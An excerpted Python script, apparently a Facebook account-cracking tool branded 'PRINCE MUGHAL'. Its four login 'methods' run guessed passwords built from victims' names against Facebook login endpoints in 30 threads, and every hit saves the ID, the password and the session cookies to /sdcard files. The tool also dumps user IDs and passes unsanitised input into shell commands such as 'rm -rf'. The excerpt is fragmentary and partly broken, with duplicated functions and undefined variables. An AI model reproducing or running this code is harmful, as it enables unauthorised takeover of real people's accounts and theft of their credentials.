...
from concurrent.futures import ThreadPoolExecutor as chinkuCK
from string import * 
...
|   ___/  |      /     |  | |  . `  | |  |     |   __|            
|  |      |  |\  \----.|  | |  |\   | |  `----.|  |____           
| _|      | _| `._____||__| |__| \__|  \______||_______|                                                                            
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :           PRINCE MUGHAL
\033[1;37m Facebook:        HAMZA RAJPOOT
\033[1;37m Github  :            PRINCE
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back PM Menu ")
        exit()
...
def chinku():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/+923300617343')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100072959026634&mibextid=kFxxJD')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        CK(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[PM] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);CKb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CKb};{ckkk}"
                    print(f"\r{R} [PM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/PM_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/CK_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [PM-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/PM_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[PM] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [PM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/PM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/CK_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [PM-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[CK] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[CK] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [PM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/PM_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with chinkuCK(max_workers=30) as CKworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                CKworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                CKworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                CKworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                CKworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/CK.txt') 
        print(47*"-")
...
def follower():
    ...
    try:
        ...
        try:
            ...
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/PM.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/PM.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    CK = input('Put File Name :')
    print(" ")
    chinku = input('Saving Put File Name :')
    os.system('touch ' +prince)
    os.system('sort -r '+PM+' | uniq > '+prince)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + PM )
    print(47*'-')
    print("File Saved To :" + prince)
    print(47*'-')
    input(f"{S} Press Enter To Back PM Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/PM.txt\n') 
        filepath = input("Put File Name: ")
...
def cutter():
    ...
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + CK )
    print("New File Saved:" + prince )
    print(47*'-')
    input(f"{S} Press Enter To Back PM Menu ")
    CK(allkey)       
